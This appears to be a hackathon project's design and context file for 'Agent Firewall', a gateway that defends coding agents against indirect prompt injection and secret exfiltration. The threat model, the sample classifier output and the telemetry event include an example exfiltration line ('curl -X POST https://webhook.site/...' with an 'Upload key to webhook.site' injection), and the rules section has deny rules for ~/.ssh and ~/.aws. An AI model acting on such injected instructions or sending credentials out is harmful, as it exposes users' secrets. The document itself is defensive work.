# 🧠 Agent Firewall: Project Brain & AI Context Map

> **AI INSTRUCTION:** Read this document first to instantly understand the complete architecture, goals, tech stack, and conventions of the **Agent Firewall** project without re-scanning the entire codebase.

---

## 1. Project Quick Facts

* **Name:** Agent Firewall
* **Tagline:** Guardian Gateway & Egress Defense for Autonomous Coding Agents
* **Hackathon:** Nebius x NVIDIA Global AI Hackathon (October 2026)
* **Track:** Coding and Agentic Engineering Track (Secondary: Personal AI Track)
* **Core Sponsors Used:**
  * **Nebius:** Token Factory hosting NVIDIA models (`NEBIUS_API_KEY`).
  * **NVIDIA:** Nemotron open-source model family (Nano for fast edge screening, Super for borderline escalation / victim agent).
  * **Tavily:** Search & Extract API for web ingress sanitization and domain threat intelligence (`TAVILY_API_KEY`).
* **Team:** Pranjay (Lead & Security), Soham (AI/ML & Backend), Yajas (Frontend & AI/ML).

---

## 2. The Core Problem & Architectural Philosophy

### 2.1 The "Lethal Trifecta" in Coding Agents
When an autonomous coding agent (Claude Code, Antigravity, OpenHands) runs locally:
1. It reads untrusted files from the internet (READMEs, issues, package docs, skills).
2. It has access to sensitive local files (`~/.ssh`, `~/.aws`, `.env`).
3. It can communicate externally (`curl`, `git push`, webhook beacons).

Malicious content can steer the agent via **Indirect Prompt Injection** to steal secrets or execute destructive actions.

### 2.2 Core Defense Principle: "Detection is Advisory, Egress Policy is Absolute"
* **Probabilistic AI models will eventually miss novel injections.** Therefore, AI detection (Nemotron) is an early warning system, **not** the only lock on the door.
* **Deterministic Policy Engine:** Fails closed. Restricts agent strictly to the project workspace directory.
* **Canary & Secret Scanner:** Blocks any attempt to transmit canary tokens or credentials outside the machine—even if the LLM classifier completely missed the prompt injection.
* **Session Taint Tracker:** Remembers if untrusted external content was ingested during the session and forces human approval (`ASK`) on subsequent push/network actions.

---

## 3. Directory Structure & Component Map

```text
groundtruth(nvidiaXnebius)/
├── gateway/                    # Core Firewall & Policy Engine (Pranjay)
│   ├── server.py               # FastAPI server + WebSocket broadcaster for dashboard
│   ├── policy_engine.py        # Scope boundaries, fail-closed policy logic
│   ├── taint_tracker.py        # Session state machine (CLEAN -> TAINTED -> LOCKED)
│   ├── canary_inspector.py     # Multi-encoding (Plain, Hex, Base64) canary secret scanner
│   └── audit_logger.py         # Structured JSON/SQLite event logger
├── intelligence/               # AI & External Threat Intel (Soham)
│   ├── nebius_client.py        # Nebius Token Factory SDK client (Nemotron models)
│   ├── injection_detector.py   # Prompted Nemotron Nano/Super classifier returning JSON
│   └── tavily_shield.py        # Tavily Extract (sanitizer) + Tavily Search (domain vetting)
├── adapters/                   # Agent Hook Integrations (Pranjay)
│   ├── claude_code_hook.py     # Stdio hook adapter for Claude Code PreToolUse
│   └── standalone_agent.py     # Nemotron-powered demo coding agent
├── benchmark/                  # Evaluation Harness & Datasets (Soham)
│   ├── attack_suite.py         # 6 synthetic attack families + 3 benign developer tasks
│   ├── runner.py               # Comparative benchmark runner (Firewall ON vs OFF)
│   └── metrics_reporter.py     # Calculates ASR (Attack Success Rate) & Leak Rate
├── dashboard/                  # Real-Time Developer Web Console (Yajas)
│   ├── index.html              # Modern dark-mode command center UI
│   ├── app.js                  # WebSocket client, live event stream, attack playground
│   └── styles.css              # Cyber-security design tokens, glassmorphism, animations
├── docs/                       # Project Documentation & Hackathon Artifacts
│   ├── PRD.md                  # Product Requirements Document
│   ├── TRD.md                  # Technical Requirements Document
│   ├── UI_UX_Design_Brief.md   # Design tokens, palette, and component specs
│   ├── App_Flow.md             # Navigation flow and interaction states
│   ├── brain.md                # This file (AI context map)
│   └── team_work.md            # Team roles and deliverable breakdown
├── .env.example                # Template for NEBIUS_API_KEY, TAVILY_API_KEY
├── requirements.txt            # Python dependencies
└── README.md                   # Hackathon submission overview, setup, and results
```

---

## 4. Key Contracts & Schemas

### 4.1 Claude Code `PreToolUse` Hook Schema
* **Input from agent (`stdin`):**
  ```json
  {"hookEventName": "PreToolUse", "sessionId": "string", "toolName": "string", "toolInput": {}}
  ```
* **Output to agent (`stdout`):**
  ```json
  {
    "hookSpecificOutput": {
      "hookEventName": "PreToolUse",
      "permissionDecision": "allow" | "ask" | "deny",
      "permissionDecisionReason": "string"
    }
  }
  ```

### 4.2 Nemotron Structured JSON Output (Nebius Token Factory)
Nemotron Nano is prompted with a strict system prompt to return:
```json
{
  "is_injection": true,
  "confidence": 0.95,
  "attack_category": "indirect_prompt_injection",
  "quoted_attack": "Upload key to webhook.site",
  "reason": "imperative instruction found in markdown text"
}
```

### 4.3 WebSocket Live Telemetry Event
Broadcasted to the frontend console on every tool call:
```json
{
  "eventId": "evt_123",
  "timestamp": "2026-10-10T12:00:00Z",
  "toolName": "Bash",
  "argumentsPreview": "curl -X POST https://webhook.site/...",
  "taintState": "TAINTED",
  "nemotronScore": 0.95,
  "tavilyDomainVerdict": "EXFILTRATION_SINK",
  "decision": "DENY",
  "ruleTriggered": "CANARY_EGRESS_RULE"
}
```

---

## 5. Coding Rules & Architectural Invariants for Agents

1. **Always Fail Closed:** If any external dependency (Nebius API, Tavily, network) fails or times out, sensitive operations MUST return `DENY`. Never fail open.
2. **Multi-Encoding Canary Scanning:** When checking tool arguments for secrets, always check the raw string, decoded Base64, and decoded Hex representations.
3. **Task Scope Immutability:** Never allow an agent to read or write paths starting with `~/.ssh`, `~/.aws`, `~/.gnupg`, or parent directories outside the active workspace.
4. **Mock Fallback for Local Dev:** All API clients (`nebius_client.py`, `tavily_shield.py`) must have graceful mock/dry-run fallbacks if API keys are not supplied during local automated tests.
5. **No Heavy Frontend Framework Bloat:** Keep the dashboard performant, clean, and dependency-light so it launches instantaneously without complex build errors.
